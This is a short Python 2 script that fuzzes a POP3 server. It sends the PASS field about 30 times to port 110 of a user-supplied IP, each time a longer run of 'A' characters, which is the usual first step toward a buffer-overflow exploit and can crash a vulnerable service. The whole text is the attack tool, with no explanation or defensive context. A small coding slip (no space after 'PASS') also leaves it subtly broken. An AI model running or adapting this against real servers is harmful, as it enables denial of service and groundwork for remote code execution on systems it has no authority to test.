#!/usr/bin/python

import socket
import re

ip = raw_input("What IP adddress would you like to connect to: \n")

buffer=["A"]
counter=100

while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter=counter + 200

uname = raw_input("What username would you like to connect to the POP3 server using?: \n")

prog = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

if prog.match(ip):

    try:
        for i in buffer:    
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            sock.connect((ip, 110))
            print "\nConnecting to POP3 port"
            data = sock.recv(1024)
            print data
            sock.send("USER " + uname + '\r\n')
            data = sock.recv(1024)
            print "%s bytes sent to pass field" % len(i)
            sock.send("PASS" + i + '\r\n')
            sock.send('QUIT\r\n')
            sock.close()
    except:
        print "Could not connect to POP3!"

